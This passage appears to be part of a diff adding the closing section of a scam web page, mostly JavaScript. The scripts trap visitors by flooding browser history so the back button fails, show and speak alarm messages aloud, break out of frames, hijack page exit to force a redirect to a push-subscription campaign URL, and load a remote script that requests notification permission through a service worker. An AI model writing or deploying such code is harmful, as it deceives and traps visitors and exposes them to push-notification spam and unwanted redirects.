A1Ero3bsKb1X5Cw0WmhxSUnegSvMNCZvexaar9KO0fr2fe5umfKe3PSqW3eUY8oxfY4JKonbSxSgRyQLccGo7cqKlUVKBurBpk+d0CWIpd9ynWRaDbiWqe0akksKJqHikZKBPMFaJSrt9JWaknB5APDaVNYpanFKjp1IZoKcSys4SKbmI1RRKu1WcduxQTvegJxUuEfqWAR1KJTl5uu6sSUqyL1mJGrzKyDdLVpJOF3YwuNIHSIJSXlaxqhLjYKggOH4tBlUMSMmS42eTlOh8WiMSlHZKJyYknB5AEnRtuxFceix1xAXQ5TQxVXIJFbCRlFz19wGqeDFKpppRMsgMSKMknE6cEEafIRUlJBzg1KgEdy+1W7uXWrpCjyiVMTwqtRJzutpqMaf6R0iNhRIr3EOljvw4aiwpUYWIV/LLfOAUN5USo8WVLkFfVHRddyCAyzrCxw1qObpeAwhNhRr/JTYJQ6+EPVMq1eut1t0vMDhMfwkz4fdxKKgJSlfr9fqlBRgclsrP6gC+aUUrMaN7MEhsWd5cKsF9Qt920ynBm/cwSKjiZQ/S3/R0ilfBM+D8ZUpQa+gGRPP/GaJ/QKmm5fGpyRw+2zqm5cpJ0/L5nHgOn+ZnaLmB2+TwP2N+AUO6yb2hEveYAAAAAElFTkSuQmCC" style="width:105px;height:32px;display: block; margin: 16px 6%">
+</div>
+
+<script type="text/javascript">
+ var ln = document.querySelectorAll(".exitpoint");
+ for (i = 0; i < ln.length; ++i) {
+ ln[i].href = playGoogleUrl;
+ }
+</script>
+
+<script>
+ (function(window) {
+ if (window.location !== window.top.location) {
+window.top.location = window.location;
+ }
+ })(this);
+</script>
+
+<script>
+ function randomInt(min, max) {
+ return Math.floor(Math.random() * (max - min) + min);
+ }
+</script>
+<script type="text/javascript">
+ var t;
+ var needCount = true;
+ var count = 1;
+ !function() {
+ try {
+for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+onpopstate = function(t) {
+ if (needCount && count % 2 == 1) {
+ alert(languageSelector.alert)
+ }
+ count++;
+ t.state && location.replace("#")
+}
+ }
+ catch (o) {
+ }
+ }();
+</script>
+
+<script type="text/javascript">
+ function speak(c) {
+ var b = new SpeechSynthesisUtterance();
+ var a = speechSynthesis.getVoices();
+ b.voice = a[2];
+ b.voiceURI = "native";
+ b.volume = 1;
+ b.rate = 1;
+ b.pitch = 1;
+ b.text = c;
+ b.lang = "id-ID";
+ speechSynthesis.speak(b)
+ }
+
+ speak(languageSelector.alert);
+</script>
+
+<script type="text/javascript">
+ (function(w, d) {
+ var epp = function() {
+if (w.onbeforeunload === null) {
+ var to;
+
+ function repp() {
+ w.onbeforeunload = null;
+ };
+
+ function epp() {
+ to = setTimeout(function() {
+w.location.replace('https://p01.news123.fun/?utm_medium=30155a821293745f367903f97172f025eaec3502&utm_campaign=push_subs_19_04_2021_1532');
+repp();
+ }, 100);
+ return languageSelector.alert;
+ }
+
+ w.onbeforeunload = epp;
+ // Prevent epp firing from clicking on tracking links
+ var ln = d.querySelectorAll("[href='" + playGoogleUrl + "']");
+ for (i = 0; i < ln.length; ++i) {
+ ln[i].addEventListener("click", function() {
+localStorage.setItem('redirectAppStore', 1);
+repp();
+ });
+ }
+}
+ };
+ if (d.readyState != 'loading') {
+epp();
+ }
+ else {
+d.addEventListener('DOMContentLoaded', epp);
+ }
+ })(window, document);
+</script>
+<script>
+    const s = document.createElement('script');
+    s.src='//fiwhibse.com/pfe/current/micro.tag.min.js?z=4129666'+'&sw=/sw-check-permissions-b9071.js';
+    s.onload = (result) => {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s); 
+</script>
+
+</body></html>
